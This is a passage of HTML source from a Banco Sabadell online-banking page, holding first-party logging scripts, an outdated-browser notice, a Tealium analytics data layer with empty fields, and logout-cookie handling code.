Q0MGM1NjYxNmIzOTNmYzIzMGRlYzJkOGEyNzFjNDdhYTk1YjMxNjRiZjEwNTg2NTRkYzc5MTBjY2U1MzA3OTdkY2UwMTRkNDVjNGNkNTM4M2M2YzExMDQ0M2ZiNzI4ZjA0ZDQxZGY4MjJmYmI3ZDcxMGQ0NDE4M2IzZmNjYjgyZjkzNDBjMDNmYzQwNmVmNGZkYTI4MWJhZTUwMjc4NDY5OWMzNzUxMzc0NTNmODcxMzk0MGIwMjBlYWU0ODkzNjA5YmRlOTc4MjFhOTIzMjc4Mjg3NjdiM2RlNjExZmIwZDM4YWIzYzBlNjc1NzA3NDQ3YzY2MDhlZGRiNDg2Mzk2ZTZlNjE0ZWJkNjQwZDM3ZWY3YmYyMzU0MTAxODUxNjhmYjllOTJjOGMxNDA1ZjQ3ZWJkZjI0NTEzODEyNmExMjA5YTczZjdkZDNmOTc2MjZkNTkxMWQ3NTFlY2Y3ODA5MGYxNDFjMzBiNzBmMmMxYmM4Y2Q4YTFjZTFlYzhmMWM2N2JiZGYwMWU5MjdlNmQyOTY0YzY5ZWZlMGY1NmQ0ZmY3NzdkZjlmMzY4N2E5NTlkZTM3MTIzNDc2ZjYzYzE1MmI0MmExMTkwYmNiOWY5MTR8MDBlZTBiNjJlY2FhYzg5Zg%3D%3D&amp;cid=8&amp;si=1&amp;e=https%3A%2F%2Fwww.bancsabadell.com&amp;LSESSIONID=eyJpIjoiZDZrY0FcL0JlTStSa081Ymh0Mk9hb3c9PSIsImUiOiJlbzBqeEJqMFpITW1aSXE5V2hGRWdsdmRRVk9ITXcxMW82bWtwdXl2QXRzXC9qVTFpOEUxbk9rd2RcL0liam1TR2g4Wm92eWdOTFBUem9VOE9NWm1WU1NIbUxpRm9hUnZKWGVYdzdYYk1PcDB1UXpaU3QwWmk3bWFmcDVJbVpONjVQQzlXMHhDRVpQTmlMTlhWTHFpV3B3WEpTRVUwYjdGY0NJQ09XV2ZsR1NnY3UzRXRsYnpndTJCN1NWc2xxbVJwQSJ9.8306bf4d0b054058.NmQ1MzQ1NjE2NmYxZmIyYmQ0ZDliYjFiYTY3OGUyZTYxNzEyMTljMjc2YzE3NzNhMzBhYzhhYjI1YTFjZDRhNA%3D%3D&amp;t=jsonp&amp;c=_bikgh_rlylsbusq&amp;eu=https%3A%2F%2Fwww.bancsabadell.com%2Fcs%2FSatellite%2FSabAtl%2FBSOnline%2F1191332204053%2Fes%2F"></script><script type="text/javascript" async="" src="https://staticlog.bancsabadell.com/9154651/5ATFL?d=ZW5jZEB5S2xGRC9iclhva1lpNzFLR2oyaEhtUEZ6Vk5wTStkVlRYdE1pbXNOc2x0K1IyMVAxeCtVTzY5WVJqNHMwTDNkZEhMa1NwTTcyNkxlYlMyNFBKaFAxd3g0T2dOOXk3ejN2SnQ1djVBcWxBRTVSWVBrelZneERqYm1qUTlSMXhtQU43bXcrc0VWN3J0MlAyS2s5aEhseUZJVERsL1ZjYWtGak5TN1RQc1p3L09QU29oTWIwb0QvdVpVMzdCL2R6QUZQZGFoS0E9PXxkM2M3ZDk0NTI3OTUyNzJhMDI5MWQ3NDgyYTIwZDNiMmVlMGZmOWFhMTc5YjRjNjFhMjA2OWM3YzY1NDMzZTVlZDE2ZTI3MTA2N2VhOTc5MTgyYjIxZDkyOWNjMTM2MTk5ZjExNGM4OWI1NWZjZWI4M2Q3NTg0ZDgzMWFlYzUxYzRiZWRmYjhlZDg1YmQ4MGVmMDQxMmJhM2ZkZjVmNmU2NWRkYjUwMjA2NWNlNWM3MmFlNmU4ODk3MWY5NmRjMzRjYjI0ZTYwNGU3MDJhNDU5NjI5NWZjMzBkMmQ1MDQwMDI3MjIxZDBkYjYzZmIxMWU1YTI4MTRjZDY3NjRkNTNmNThjN2JmYjg2YmNlZmRhNGNiNTk2OThiMjFmMGY2NmE4M2Y1MjEzZDVkN2JmZmY2NDU2ODViMjUxM2QwN2I4MDE1ZDI4YzlkMGIzOTczM2NkZGI5ZmNiODY4YTZlMDRkMjI0NzVhMGUzNmMyMmE5MzhiYzdlYmU5NjljOGUwY2U2YmRiN2Q5ZGM4YmY3MDU5NGIzODJhN2FhOTMzNmIwODViMzQ2MmM5ZGM4Yzc1MDBmMGEyZmFiZGRjOTBhYzYwNmJlOGQzMzFhOWVmZTJkNzc2ZmU3NzBlNDc1NmVlNzVjNGIzNzM3M2RkMTMzOWY1ZGZkNzBkMmE3MTZmYTYwZXwwMGVlMGI2MmVjYWFjODlm&amp;cid=33&amp;si=0&amp;e=https%3A%2F%2Fwww.bancsabadell.com&amp;LSESSIONID=eyJpIjoiZDZrY0FcL0JlTStSa081Ymh0Mk9hb3c9PSIsImUiOiJlbzBqeEJqMFpITW1aSXE5V2hGRWdsdmRRVk9ITXcxMW82bWtwdXl2QXRzXC9qVTFpOEUxbk9rd2RcL0liam1TR2g4Wm92eWdOTFBUem9VOE9NWm1WU1NIbUxpRm9hUnZKWGVYdzdYYk1PcDB1UXpaU3QwWmk3bWFmcDVJbVpONjVQQzlXMHhDRVpQTmlMTlhWTHFpV3B3WEpTRVUwYjdGY0NJQ09XV2ZsR1NnY3UzRXRsYnpndTJCN1NWc2xxbVJwQSJ9.8306bf4d0b054058.NmQ1MzQ1NjE2NmYxZmIyYmQ0ZDliYjFiYTY3OGUyZTYxNzEyMTljMjc2YzE3NzNhMzBhYzhhYjI1YTFjZDRhNA%3D%3D&amp;t=jsonp&amp;c=bcnvcwvsmzrilmp_&amp;eu=https%3A%2F%2Fwww.bancsabadell.com%2Fcs%2FSatellite%2FSabAtl%2FBSOnline%2F1191332204053%2Fes%2F"></script><script type="text/javascript" async="" src="https://staticlog.bancsabadell.com/9154651/5ATFL?d=ZW5jZEBaSUNZK01HcXZTdHVRWXU5UU9WOHNGdG1LNGk2QmxUT3gzcnVZMU1HQmRYS08rWFJ1cG9FTmJwRks5MHYvbkh4aUxxMTk2aE5ZVEtyNXBvTTJMYlljNmNxZFJTM2dpRUZCTS8rT083RGVGSGtWT0FPT2NuSUs3M3BkY1FZcG43dENlNEc2dDZMWlZxWXJ4Zzlpditodis3Znl1TWRuVENuVitFakhORkN0ejJESjNxMk1KQy9wMzdxRmoyc3ZUemhnTDBQaVJzMUpsQVBOR0g4TWh1THFCTzdlVkh2a2xtR2drK0Z4amVidEZXN2Y1UEVnNmlXQ3FNYTAxVWJOZDZUdjg1WFh4d3Q3QWZNRytHNENhdVFBeER2OG8xV0RMM3dYdysyK3lQczdWN21sMWI1YTFiemVnaGVJTUFEYk1wOE5Fa1NkRWpUdEF5WG1EQm8zRmRXbWNuVHIyRE5BNGx2YzNaZVJwRkxuRXFQeXUxemVCeFRXQW81Q0ZZVm1ZWWNvTWxkSTFHSmttRHhabVZKczdlNk8zaXQ4RTNjVjZmMWRzczdRTHNhTEwvL051NDlIcDBvODlEQzE5QzhBWm4wSFNCd0dFajVnK29vM1p2eWg4Um9ueTV3Rkhvck1xbE5YWWZWSDNSTzN6c2w2WU1JOWY4c3ZtKzh3a0VWMXRnbC9FbWdpRHA3NkhqWkJheG84aHFuVnVnMWxRPT18NWNmMmI4N2U2OTcwNTc1MjRmYmIwMmY4ZWY5NmYzNmNjMTI3YTdjOGQxNmE2Mzc3MDk5MmQ1MzVjYjFiZDczZTQzODRjOGZhNDU2MTQ3MDI0ODM1MDA1MjI1ZGIwZTdmYjdjN2Y5ZTkzNjJmODZkNjA1ZjFlY2FmNDMwYmY0MjgzMTEzMDZhNGQwMGIzMmQ3ZDc4ZmQzYTI2MzRmNDk5NzY4MGNiYmQ0MzhlNDg4YTdiMTk5NTRiMjUyMWZmYzE1YmU1ZDMyNDI0NzYwMzJjMDU5YTNlMTc1NDU3MDg5MDMyNjM5Zjc1NGU1ZjM5MDFjZGQ0Yzc3MmY1OTI1OTM1NDY3OTc0ZTYzNmMxMmJmZDlhNGNmMGUxMWZhMjY0ZTgxZmY4OWZlZTdlYzA3ZDBjZWJmNjFlZjIyZDQ3MGRmY2VjZDk1M2YzYzBlMWRiYzZjMjNlNzM1YmQ2YWJjNjYxOWU3NTI4ZGU0N2U4ODEyYTZiMDVjOTE4ZmJmYTA4MDBlMGMxYzAyMmNjMTZiOTZhNTgwMmUxMTJlNTcyOTViNWI0YjBiYWNmZmE0ODljYmFiMDQ3MjI0ZDdjMzQ1ZTRiNWRhMWVjMzRhYjZlY2VjOTI4NmZlM2Y0ODlhMjg2ZGFjNzJkMTZhYmZmNDcxMTMyZGVkMmQ5NzcwNmEwNmQzNmV8MDBlZTBiNjJlY2FhYzg5Zg%3D%3D&amp;cid=8&amp;si=1&amp;e=https%3A%2F%2Fwww.bancsabadell.com&amp;LSESSIONID=eyJpIjoiZDZrY0FcL0JlTStSa081Ymh0Mk9hb3c9PSIsImUiOiJlbzBqeEJqMFpITW1aSXE5V2hGRWdsdmRRVk9ITXcxMW82bWtwdXl2QXRzXC9qVTFpOEUxbk9rd2RcL0liam1TR2g4Wm92eWdOTFBUem9VOE9NWm1WU1NIbUxpRm9hUnZKWGVYdzdYYk1PcDB1UXpaU3QwWmk3bWFmcDVJbVpONjVQQzlXMHhDRVpQTmlMTlhWTHFpV3B3WEpTRVUwYjdGY0NJQ09XV2ZsR1NnY3UzRXRsYnpndTJCN1NWc2xxbVJwQSJ9.8306bf4d0b054058.NmQ1MzQ1NjE2NmYxZmIyYmQ0ZDliYjFiYTY3OGUyZTYxNzEyMTljMjc2YzE3NzNhMzBhYzhhYjI1YTFjZDRhNA%3D%3D&amp;t=jsonp&amp;c=hmtekzzsyahu_rzs&amp;eu=https%3A%2F%2Fwww.bancsabadell.com%2Fcs%2FSatellite%2FSabAtl%2FBSOnline%2F1191332204053%2Fes%2F"></script><script type="text/javascript" async="" src="https://staticlog.bancsabadell.com/9154651/5ATFL?d=ZW5jZEBCMFUvbjNTVzRoSk1hZWVQSE0zT29SZVAwaEpuOGZrS3FpSW9iUG9tRnVjMDd3SE9OcWJGQTdvNnpZWi9SbWVHdWhSY25zbDJYWGdWODE3YmRJamNWNW14SllUdjJyejBxYkIxME0raEdYL0RvQUlBQjZqelFwUFlXWFN2bC91TnFVdHpZOXNuRFlDRkx1ZThGVWRIMFRtZG8vYnFaemtPWllaS3ZHUFMwc0kvYlB0UW10bjZET2c0dzR0eG41N2F3WTBnZ0tPeVYxQ0IvdmNGN2hMWU0vSVFoN3krbGd5M05nWTJDTTNUMHpyQmlQMzNyc3NxMWkrZ2F3eW9qWU1oNWMwUFczU3plaUxiQU9lUTVudWNRSGVCN0VkR2J0Tk9rY3hhR2JqMWZMRWJKckMwMXo0bk1VWkJMT0V0OStqUko5WGxwK2VhMWtabUxGQWRRNEpHcnAvMFIzejg0NDdKT200Mk44Vk1QODhLNmg0R0dGZk96R29Yc05UeGVVVmYreHJuUnRBT0l2Qkl5WUxOT3p6VnRjWVplZ0wyUDB2Ti9BNnhvZ0hva0lJSU5uY0krZS9NcktNZVZrdWdvWCtoS2dJRElzU0krNEZiTWlIck9kMnliQXNpSjQvdVNRRGhRSEhiOEdKay81SzU2bk85NTVHbTRTanV6bHVuRVhHZHAyNUkxZnhuTlB6aVFjU0Z0NWJCYUxyRUlnPT18OTg2OGEyNTNlYzU3ZjA1NDM4N2NkMDYwY2JhZTM4MmFjZGNmZDVmNDA2ZDQzYjZhODlmM2M2OTU2YjNjYTFlMWFiY2JhMmFmNzBmZGYzOTRkMzM0NDQ1Njc3ZjEzYzcwN2FmMGEwOWNjY2QyNjM4YjhlOTcwZTg5ODNkZWQ3ZTQxNjA5NTI0M2M3NDM3ZDQ2ZGQ1ZWQxOTM4ZmRiZjczODU2Mzg1MTZlODcwM2MyNWIwMzFlOWFjMmFlN2QxY2MzMWMxMmZjYzFkMzdiYWUxOWNlYzYzNzA5YmVjOTU2OTFhMTRhZjNjYzUyNGNkM2M0MTRiMTY4ZGJjZWI0YjRhODE1YWQ2ZTZhMjM2YWZlYWMzNzdjYzgzMGMxNWI5YTMzMWEyYzdjMzkyODlmYzVmMGI5ZWZmMTQ4ODQ1Nzk5MmVlYWJmNzc1Njg1YWMzMzMwMjEwZjZmZTBkNTMxYmM4YmFmNTEwMTUwOWRjZWEzNGJjZjY0NjBlMDJjMzk2OTU4Yzg4NGQ4ZTBjODRmYmU3YmU2MmIyMzNhZWIyYmJiNjRkZjVmNjRmMDIzNzhlNDg4YjVmYjVjMWZiYjI4MTU4Njc4MzI3OWNlYzBjNTZlNDk4NTM5ZWRjZjFmYTJiNTA1MTFiNzVmYzJjMjQ2MGQ3NzAyZGM1NzA3MTUwYWEzM2R8MDBlZTBiNjJlY2FhYzg5Zg%3D%3D&amp;cid=8&amp;si=1&amp;e=https%3A%2F%2Fwww.bancsabadell.com&amp;LSESSIONID=eyJpIjoiZDZrY0FcL0JlTStSa081Ymh0Mk9hb3c9PSIsImUiOiJlbzBqeEJqMFpITW1aSXE5V2hGRWdsdmRRVk9ITXcxMW82bWtwdXl2QXRzXC9qVTFpOEUxbk9rd2RcL0liam1TR2g4Wm92eWdOTFBUem9VOE9NWm1WU1NIbUxpRm9hUnZKWGVYdzdYYk1PcDB1UXpaU3QwWmk3bWFmcDVJbVpONjVQQzlXMHhDRVpQTmlMTlhWTHFpV3B3WEpTRVUwYjdGY0NJQ09XV2ZsR1NnY3UzRXRsYnpndTJCN1NWc2xxbVJwQSJ9.8306bf4d0b054058.NmQ1MzQ1NjE2NmYxZmIyYmQ0ZDliYjFiYTY3OGUyZTYxNzEyMTljMjc2YzE3NzNhMzBhYzhhYjI1YTFjZDRhNA%3D%3D&amp;t=jsonp&amp;c=yurcbudupbqxnoui&amp;eu=https%3A%2F%2Fwww.bancsabadell.com%2Fcs%2FSatellite%2FSabAtl%2FBSOnline%2F1191332204053%2Fes%2F"></script><script type="text/javascript" async="" src="https://staticlog.bancsabadell.com/9154651/5ATFL?d=ZW5jZEBLeS84VFBZMGFGTllrOTVjMVNYTWtSWnFHNW5JTWRVQ3F0Z1oyR0N4a2hIczVtRUU1ZkVDb0hSbXJnMFJ4K2ZLMEtJcDBhU0c4NnU4c2x2WTFYUjJwYnl1aUxZMi9oRHlmaXhXRWM0TTBHQU5XWWtEN1JiZGxTUWJiRWJYSnc0TjQxbWN5R1RHdG1zMUg3bGttSlBIN2JNUnlSMHdiTHJZRnJVR0x5QkJrbE1wa2xvOVR0OTVkVER5Q0lDbk0rWGVRK0U3Zk1hYnIzVnJJakJGMUZXaDNuazh4SkhKUDZycENrZDZGWmFZQ3JZQWZpOUJKZmdBMVdPUVd0dm43c21BN2N2U3VJRVZzWEFCTTRxYnBidjducllUNWJyWnQ0SkdXNmVFemVScWtRSGlTUFdDZy9qS3NycW9GeGU2TEpqd2RvUnd4bCtuSE1Za1FxREthWEVRZTFFTDg0TEVhTHhMejBvUkZpTW9CdEp6ZFpVMGpmZmJuSGk2RFFUNXBhZ1N3UmM3WnM2c2lsZ01laVRrekRyUmVmZW55K1dVZkxUcnkzM0FxTHNMNEdhcEJzQWxxUkM5ODRpbFlTakZibFhOZWU2WjFoQ2hFL2JOTjFCNmwwSU1iUEFpTFNIYlFMRFVmcFZGbnA2WHlOWENLOUNMcnhqaE42WTNoYXFwRkl2VUt4ZmQzejg5elVWRjJFNlc0T0hONGhiWXwxYWVlY2E3ZDcwNGIxZjE0N2I1MjRhNTI4YTI0MjkzYmE5N2JlMmEzOWJjZTg0OTg0Zjg4NDYzYjM0MjQ2ZGI5YWMyOTFkZjMwZjM3Y2U2YjUwYzI1YjkxYzY1YzJmOGU0OTg5YTA0ZTIxMTNmZjdhYjY1ODBlYjljOTUyYTFmOGMwNWU2ZjU5Y2MxMTEzZjA1N2JhNzI1YjQwZDYyYzg3NWE0M2Y1MWIyYmRmYjhmYjJkZmVhMzdkNGZhOTczMTRhYmM5YzFlY2JjNDI0YmIxODBhYWM2MWNmOGEzNTVhNDk3MTUxMDM1NmNkNGMzOTVlZjk3YmVkNzFiNzVkYzk0MzExN2YyNjg1NGI2ODczMThkZGFmY2Y3ZDM3ODI2NGUzNzg1N2M4YmVlMTNhMjA0ZGZhNjA2MzNkZGYwYjVmNDg1OTViYTVhYmE0ZDhhNGNlZjZhOWRjZjlmYWUxMDQ1ZWY3NTVjODJhMzJmYjE4OGUyNjM5ZDYyNzBhODk1YWE1ZjM3YTM5MmNiZjlhOWNhM2U5MDU5NWY2YWViZDIxZGVlMjlkOTJhZmNjODgyM2RlNzNiN2UyODMyMjJjYTFjNDQ0YTkzYzU4MDBiNTI5NjEyOTgwYWVhMmJjMThkMTExNWYzOTA3MzQ5MTUxM2Q4ZmQ3NGMwNGIyYjdjZTM1ZHwwMGVlMGI2MmVjYWFjODlm&amp;cid=8&amp;si=1&amp;e=https%3A%2F%2Fwww.bancsabadell.com&amp;LSESSIONID=eyJpIjoiZDZrY0FcL0JlTStSa081Ymh0Mk9hb3c9PSIsImUiOiJlbzBqeEJqMFpITW1aSXE5V2hGRWdsdmRRVk9ITXcxMW82bWtwdXl2QXRzXC9qVTFpOEUxbk9rd2RcL0liam1TR2g4Wm92eWdOTFBUem9VOE9NWm1WU1NIbUxpRm9hUnZKWGVYdzdYYk1PcDB1UXpaU3QwWmk3bWFmcDVJbVpONjVQQzlXMHhDRVpQTmlMTlhWTHFpV3B3WEpTRVUwYjdGY0NJQ09XV2ZsR1NnY3UzRXRsYnpndTJCN1NWc2xxbVJwQSJ9.8306bf4d0b054058.NmQ1MzQ1NjE2NmYxZmIyYmQ0ZDliYjFiYTY3OGUyZTYxNzEyMTljMjc2YzE3NzNhMzBhYzhhYjI1YTFjZDRhNA%3D%3D&amp;t=jsonp&amp;c=lzzx_dazffeqelyk&amp;eu=https%3A%2F%2Fwww.bancsabadell.com%2Fcs%2FSatellite%2FSabAtl%2FBSOnline%2F1191332204053%2Fes%2F"></script></head><body style="font-size: 0.625em;">
<script type="text/javascript" src="https://www.bancsabadell.com/StaticFiles/GrupoBS/js/jquery-latest.js"></script>



    

    <style>
        #msgobsoleto{
            position: fixed;
            bottom: 42%;
            right: 0;
            display: none;
            z-index: 9999;
        }
    </style>

    <div id="msgobsoleto">
        <style type="text/css">.capaObs{font-family: 'Arial', sans-serif;background-color: #ebebeb;height:175px;-webkit-box-shadow: 0 0 5px 2px #cccccc; box-shadow: 0 0 5px 2px #cccccc;color:black;text-align: left;}.capaObs.plegada{width:35px;height:215px;}.capaObs .vertical {writing-mode: tb-rl;display:block;-webkit-transform:rotate(-90deg);-moz-transform:rotate(-90deg);-o-transform: rotate(-90deg);-ms-transform:rotate(-90deg);    transform: rotate(-90deg);    white-space:nowrap;    bottom:0;    width:20px;    height:20px;    margin-left:7px;    font-weight: bold;    font-size: 13.5px;    text-decoration: none;    color: black;    margin-top: 15px;    margin-bottom: 10px;}.capaObs.plegada a:nth-child(2){writing-mode: lr-tb;margin-top: 150px;margin-left:9px;}.capaObs #flechita{margin-left: 12px;margin-top:12px;}.capaObs.desplegada{width:375px;background-color: white;border: #bfbfbf 1px solid;display:none;}.capaObs .cabeceraObs{background-color: #ebebeb;width:100%;height:33%;border-bottom: #bfbfbf 1px solid;}.capaObs .cabeceraObs h3{display:block;float:left;margin:18px 0px 0px 15px;font-size:18px;}.capaObs .cabeceraObs img{display:block;float:right;margin:17px 15px 0px 0px;border:none;}.capaObs .contenidoCapaObs{clear:both;padding-left: 10px;font-size: 13.5px;}.capaObs .contenidoCapaObs img{display:block;float:left;margin: 15px 0px 0px 20px;}.capaObs .contObsDer{display:block;float:right;width:85%;}.capaObs .contenidoCapaObs p{line-height: 20px;margin:15px 10px 0px 0px;}.capaObs .contenidoCapaObs a{display:block;clear: both;background-color: #09c;color: white;font-weight: bold;width:120px;border-radius: 3px;margin-top:10px;text-align:center;text-decoration:none;line-height: 35px;}</style>
<div id="capaObsMin" class="capaObs plegada" onclick="return capaObsMinToMax();"><img id="flechita" alt="" width="10" height="16" src="https://www.bancsabadell.com/StaticFiles/GrupoBS/img/flechitaObs.png"><a class="vertical" href="javascript:void">Actualice su navegador</a></div>
<div id="capaObsMax" class="capaObs desplegada">
<div class="cabeceraObs">
<h3>Actualice su navegador</h3>
<a onclick="return capaObsMaxToMin();" href="javascript:void"><img alt="" width="23" height="25" src="https://www.bancsabadell.com/StaticFiles/GrupoBS/img/x-negra.png"></a></div>
<div class="contenidoCapaObs"><img alt="" width="7" height="36" src="https://www.bancsabadell.com/StaticFiles/GrupoBS/img/icon-alert.gif">
<div class="contObsDer">
<p>Está usando una versión antigua de su navegador. Le recomendamos que lo actualice o cambie de explorador para mejorar su experiencia web.</p>
</div>
</div>
</div>
<script>
	function capaObsMinToMax(){
		document.getElementById("capaObsMin").style.display="none";
		document.getElementById("capaObsMax").style.display="block";
		if(typeof mostrarObsoleto === "function") {
			mostrarObsoleto();
		}
		return false;
	}

	function capaObsMaxToMin(){
		document.getElementById("capaObsMax").style.display="none";
		document.getElementById("capaObsMin").style.display="block";
		if(typeof mostrarObsoleto === "function") {
			mostrarObsoleto();
		}
		return false;
	}

</script>

    </div>

   
    
    
    <script src="https://www.bancsabadell.com/StaticFiles/GrupoBS/js/check_navigator.js?version=22.10"></script>

<div id="demo" style="display: none; position: absolute; top: 0px; left: 0px; z-index: 997; background-image: url('https://www.bancsabadell.com/StaticFiles/GrupoBS/img/overlay.png'); width: 100%; height: 100%;"></div><div id="demoDos" style="display: none; position: absolute; top: 0px; left: 0px; z-index: 997; background-image: url('https://www.bancsabadell.com/StaticFiles/GrupoBS/img/overlay.png'); width: 100%; height: 100%;"></div><script type="text/javascript" src="https://www.bancsabadell.com/StaticFiles/GrupoBS/js/jquery-latest.js?version=22.10"></script><script type="text/javascript" src="https://www.bancsabadell.com/StaticFiles/GrupoBS/js/tagtealium.js?version=22.10" class="optanon-category-C0002 "></script>
		  
		  <script type="text/javascript">
			var utag_data = {
			  'esProceso': 'true'
			}
			var tealium_data={
				'actividadLoginLogout': '',
				'bancoDestino': '',
				'BSPersonalizacion': '',
				'canal': '',
				'categoriaPagina': '',
				'categoriaProducto': '',
				'chatActivo': '',
				'click_cta_info': '',
				'codigoOperacion': '',
				'cuentaDestino': '',
				'cuentaOrigen': '',
				'divisa': '',
				'divisaAsegurar': '',
				'divisaContrapartida': '',
				'docLoginEmpresa': '',
				'entorno': '',
				'errorCode': '',
				'errorDescription': '',
				'errorPage': '',
				'errorType': '',
				'fechaAlta': '',
				'fechaNacimiento': '',
				'formError': '',
				'formStatus': '',
				'idCliente': '',
				'idioma': '',
				'idPagina': '',
				'idUser': '',
				'idUsuarioAutorizado': '',
				'importe': '',
				'localidadCodigoPostal': '',
				'modulosBienvenida': '',
				'nivel1': '',
				'nivel2': '',
				'nivel3': '',
				'nivel4': '',
				'nivel5': '',
				'nivel6': '',
				'nivel7': '',
				'nivel8': '',
				'nivel9': '',
				'nombreLink': '',
				'nombreOperativa': '',
				'nombreProducto': '',
				'nombreSearch': '',
				'numTarjeta': '',
				'oficinaAsignada': '',
				'oficinaGestora': '',
				'operationId': '',
				'operationSubId': '',
				'paisBenef': '',
				'pasoOperativa': '',
				'razonSocial': '',
				'regionCliente': '',
				'resultadoSearch': '',
				'rolUserEmpresa': '',
				'searchKeyword': '',
				'segmentoComercial': '',
				'segmentoCorp': '',
				'segmentoEstrategico': '',
				'sessionId': '',
				'subsegmentoComercial': '',
				'subsegmentoCorp': '',
				'terminoSearch': '',
				'tipoImpuesto': '',
				'tipoOperacion': '',
				'tipoSearch': '',
				'tipoUser': '',
				'valoracionOperativa': '',
				'versionDL': '',
				'paso': '',
				'esProceso': 'false'
			  }
			  function vaciarTealium() {
				tealium_data.actividadLoginLogout = "";
				tealium_data.bancoDestino = "";
				tealium_data.BSPersonalizacion = "";
				tealium_data.canal = "";
				tealium_data.categoriaPagina = "";
				tealium_data.categoriaProducto = "";
				tealium_data.chatActivo = "";
				tealium_data.click_cta_info = "";
				tealium_data.codigoOperacion = "";
				tealium_data.cuentaDestino = "";
				tealium_data.cuentaOrigen = "";
				tealium_data.divisa = "";
				tealium_data.divisaAsegurar = "";
				tealium_data.divisaContrapartida = "";
				tealium_data.docLoginEmpresa = "";
				tealium_data.entorno = "";
				tealium_data.errorCode = "";
				tealium_data.errorDescription = "";
				tealium_data.errorPage = "";
				tealium_data.errorType = "";
				tealium_data.fechaAlta = "";
				tealium_data.fechaNacimiento = "";
				tealium_data.formError = "";
				tealium_data.formStatus = "";
				tealium_data.idCliente = "";
				tealium_data.idioma = "";
				tealium_data.idPagina = "";
				tealium_data.idUser = "";
				tealium_data.idUsuarioAutorizado = "";
				tealium_data.importe = "";
				tealium_data.localidadCodigoPostal = "";
				tealium_data.modulosBienvenida = "";
				tealium_data.nivel1 = "";
				tealium_data.nivel2 = "";
				tealium_data.nivel3 = "";
				tealium_data.nivel4 = "";
				tealium_data.nivel5 = "";
				tealium_data.nivel6 = "";
				tealium_data.nivel7 = "";
				tealium_data.nivel8 = "";
				tealium_data.nivel9 = "";
				tealium_data.nombreLink = "";
				tealium_data.nombreOperativa = "";
				tealium_data.nombreProducto = "";
				tealium_data.nombreSearch = "";
				tealium_data.numTarjeta = "";
				tealium_data.oficinaAsignada = "";
				tealium_data.oficinaGestora = "";
				tealium_data.operationId = "";
				tealium_data.operationSubId = "";
				tealium_data.paisBenef = "";
				tealium_data.pasoOperativa = "";
				tealium_data.razonSocial = "";
				tealium_data.regionCliente = "";
				tealium_data.resultadoSearch = "";
				tealium_data.rolUserEmpresa = "";
				tealium_data.searchKeyword = "";
				tealium_data.segmentoComercial = "";
				tealium_data.segmentoCorp = "";
				tealium_data.segmentoEstrategico = "";
				tealium_data.sessionId = "";
				tealium_data.subsegmentoComercial = "";
				tealium_data.subsegmentoCorp = "";
				tealium_data.terminoSearch = "";
				tealium_data.tipoImpuesto = "";
				tealium_data.tipoOperacion = "";
				tealium_data.tipoSearch = "";
				tealium_data.tipoUser = "";
				tealium_data.valoracionOperativa = "";
				tealium_data.versionDL = "";
				tealium_data.paso = "";
				tealium_data.esProceso = "false";
			  }

			function newDataLayer() {
				return {
					"pagina": {
						"categoriaPagina": "",
						"chatActivo": "",
						"idioma": "",
						"idPagina": "",
						"nombreLink": ""
					},
					"prod": {
						"categoriaProducto": "",
						"nivel1": "",
						"nivel2": "",
						"nivel3": "",
						"nivel4": "",
						"nivel5": "",
						"nivel6": "",
						"nivel7": "",
						"nivel8": "",
						"nivel9": "",
						"nombreProducto": "",
						"paso": ""
					},
					"user": {
						"BSPersonalizacion": "",
						"docLoginEmpresa": "",
						"fechaAlta": "",
						"fechaNacimiento": "",
						"idCliente": "",
						"idUser": "",
						"idUsuarioAutorizado": "",
						"localidadCodigoPostal": "",
						"modulosBienvenida": "",
						"oficinaAsignada": "",
						"oficinaGestora": "",
						"paisBenef": "",
						"razonSocial": "",
						"regionCliente": "",
						"rolUserEmpresa": "",
						"sessionId": "",
						"tipoUser": "",
						"acceso": ""
					},
					"operativa": {
						"bancoDestino": "",
						"codigoOperacion": "",
						"cuentaDestino": "",
						"cuentaOrigen": "",
						"divisa": "",
						"divisaAsegurar": "",
						"divisaContrapartida": "",
						"ibanDestino": "",
						"ibanOrigen": "",
						"idProceso": "",
						"importe": "",
						"nombreOperativa": "",
						"operationId": "",
						"operationSubId": "",
						"pasoOperativa": "",
						"tipoOperacion": "",
						"valoracionOperativa": "",
						"numTarjeta": "",
						"segmentoComercial": "",
						"segmentoCorp": "",
						"segmentoEstrategico": "",
						"subsegmentoComercial": "",
						"subsegmentoCorp": "",
						"tipoImpuesto": ""
					},
					"area": {
						"canal": "",
						"entorno": ""
					},
					"error": {
						"errorCode": "",
						"errorDescription": "",
						"errorPage": "",
						"errorType": ""
					},
					"form": {
						"formError": "",
						"formStatus": ""
					},
					"busqueda": {
						"nombreSearch": "",
						"resultadoSearch": "",
						"searchKeyword": "",
						"tipoSearch": ""
					},
					"actividad": {
						"actividadLoginLogout": ""
					},
					"internos": {
						"esProceso": "",
						"versionDL": ""
					},
					"eventos": {
						"click_cta_info": ""
					}
				};
			}

			var sitio = 'SabAtl';
			
			
			
		
							(function(a,b,c,d) {
								a='//tags.tiqcdn.com/utag/sabadell/main/prod/utag.sync.js';
								b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a);
							})();
							
					(function(a,b,c,d){
					  a='https://tags.tiqcdn.com/utag/sabadell/main/prod/utag.js';
					  b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[3];a.parentNode.insertBefore(d,a.nextSibling);})();
					

		  </script><a name="Top"></a><script>
	accesoInterno = 'false';
	tipoCabeceraAMostrar = 'nueva2.0';
	esTransaccional = 'null';
</script><script>
  //<![CDATA[
	function setCookieLogout(c_name,value,exdays){
		var exdate = new Date();
		exdate.setDate(exdate.getDate() + exdays);
		var c_value = escape(value) + ((exdays==null) ? ";path=/" : "; expires=" + exdate.toUTCString() + ";path=/");
		document.cookie = c_name + "=" + c_value;
    }
	function nobackbutton(){
		window.location.hash="no-back-button";
		window.location.hash="Again-No-back-button" //chrome
		window.onhashchange=function(){window.location.hash="no-back-button";}
	}			 
	var paginaActual = document.location.href.toLowerCase();
	if (paginaActual.indexOf("dologout") != -1 || paginaActual.indexOf("logoutsuccess") != -1) {
			setCookieLogout("logout","true");
			if (paginaActual.indexOf("txbsa") != -1 ) {
				if (window.addEventListener) {
					window.addEventListener('load', nobackbutton);
				}
				else if (window.attachEvent) {
					window.attachEvent('onload', nobackbutton);
				}
			}							   
	} else {
			var cookieLogout=getCookie("logout");
			setCookieLogout("logout","");
			if (cookieLogout=="true" && esTransaccional=="true") {
					history.go(1);
			}
	}
  //]]>
</script>
	
	

	
	  
	  
	  
	  
	

	
	
				
